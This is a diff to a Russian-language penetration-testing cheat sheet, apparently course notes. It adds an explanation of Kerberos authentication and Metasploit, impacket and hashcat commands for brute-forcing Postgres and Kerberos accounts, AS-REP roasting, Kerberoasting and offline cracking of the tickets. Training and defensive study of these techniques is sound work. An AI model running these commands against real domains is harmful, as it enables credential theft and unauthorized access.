@@ -357,7 +357,7 @@ postgres (15%)
 
 Брутаем стандартные учетки
 msf6> use auxiliary/scanner/postgres/postgres_login
-msf6> set rhosts <ip>
+msf6> services -p 5432 -R
 msf6> run
 
 Эксплуатация под windows
@@ -635,7 +635,7 @@ meterpreter> run post/windows/gather/smart_hashdump
 meterpreter> ps							Выводим список процессов и ищем PID 64-биного
 meterpreter> migrate <492>					Теперь мы имеем 64-битный meterpreter
 
-meterpreter> sysifo						Информация о машине
+meterpreter> sysinfo						Информация о машине
 
 Если машина без портов, скорее всего они нестандартные
 nmap <ip> -p- --open -sV
@@ -683,6 +683,37 @@ Port 88 (kerberos) - признак контроллера домена
 
 
 
+Работа Kerberos
+
+1.1) Пользователь включает компьютер и вводит свою доменную учетку
+AS-REQ 1.2) Запрос с паролем идет на Authentication Server проверяется с кредами из БД
+AS-REP 2.1) AS отправляет session key и TGT билет на машину пользователя (билет жвет 8 часов, это мультипаспорт)
+2.2) TGT записывается в память LSASS и хранится там 8 часов (или до первой перезагрузки)
+Теперь пользователь может работать с другими сервисами
+
+Пользователь хочет получить разрешение сходить на сервер А
+TGS-REQ 3.1) Он отправляет свой TGT билет, session key и запрос к серверу A на Ticket Granting Server
+3.2) TGS проверяет TGT билет, sesion key и факт сущестования сервера A
+TGS-REP 4) TGS отправляет TGS билет пользователю и session key
+
+Пользователь идет на сервер А
+Service-REQ 5) Пользователь отправляет TGS билет на проверку серверу А и разрешает доступ в зависимоти от прав пользователя, записанных в билете
+6) Пользователь получает (или не получает) доступ к серверу А
+
+
+После ввода пароля в память LSASS кладутся:
+хеши des_cbc_md5 aes128_hmac aes56_hmac, а так-же NTLM хеш
+Обычно используется aes256_hmac, но AS примит любой из них (это детектится)
+
+TGT билет
+Client Info
+User Restrictions
+Ticket Lifetime
+Ticket Flags
+Authorization Data (С Домен Контроллера) шифруется на ключе пользователя krbtgt
+
+
+
 Атаки
 
 Kerberos Brute
@@ -693,18 +724,25 @@ msf6> set rhosts <>
 msf6> set USER_FILE <user.txt>
 msf6> set DOMAIN <ignite.local>
 msf6> exploit
-Узнав существующие учетки бруатем их по словарям
+Узнав существующие учетки бруатем их пароли по словарям
 
 
 
 AS Rep Roasting/impacket
-Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить
-$ getmpusers.py
+Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить оффлайн
+$ python impacket/examples/GetNPUsers.py CONTOSO.COM/Administrator:'P@ssw0rd' -request
+В результатен получаем имя пользователя, у которого отключена preauth и его билет
 
 
 
 Kerberoasting/impacket (90%)
-GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs
+$ impacket/examples/GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs
+
+
+
+Брутаем полученные билеты
+$ hashcat -m 18200 <ASRepfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для AS rep Roasting
+$ hashcat -m 13100 <Kerbfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для Kerberoasting
 
 
 
@@ -838,3 +876,11 @@ $ psexec.py -k -no-pass Administrator@<domain> -target-ip <ip>
 
 Silver Ticket
 Максимум на месяц
+
+
+
+
+
+Занятие 8
+
+powerapp - скрипт дял повышения привелегий и ошибок конфигурации
